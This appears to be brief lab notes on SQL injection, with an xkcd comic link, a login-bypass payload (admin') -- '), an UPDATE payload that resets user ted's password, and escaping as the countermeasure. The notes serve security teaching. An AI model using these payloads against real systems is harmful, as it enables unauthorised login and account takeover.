# SQL Injection

### Funny Cartoon

Exploits of a Mom

(from https://xkcd.com/327/ )

![](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)

### task1

login with username

```sql
admin') -- '
```

### task2

set company as below

```sql
', pass=sha1('1') where name='ted' -- '
```
#### task3

countermeasure, escape string company.

```php
mysql_real_escape_string()
```
